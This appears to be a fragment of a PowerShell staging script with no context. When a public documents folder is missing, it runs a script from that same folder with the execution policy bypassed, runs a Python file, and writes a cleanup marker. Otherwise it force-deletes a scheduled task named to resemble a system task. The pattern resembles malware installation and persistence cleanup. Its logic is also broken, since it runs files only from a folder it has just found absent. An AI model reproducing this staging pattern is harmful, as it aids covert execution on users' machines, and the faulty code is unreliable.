if(-not Test-Path "C:\Users\Public\Documents\"){
	powershell.exe -ep bypass C:\Users\Public\Documents\inst.ps1
	python C:\Users\Public\Documents\file.py
	echo "done">>C:\Users\Public\Documents\cleanme0.txt
}else{
	schtasks.exe /delete /tn "systemsc" /f
}
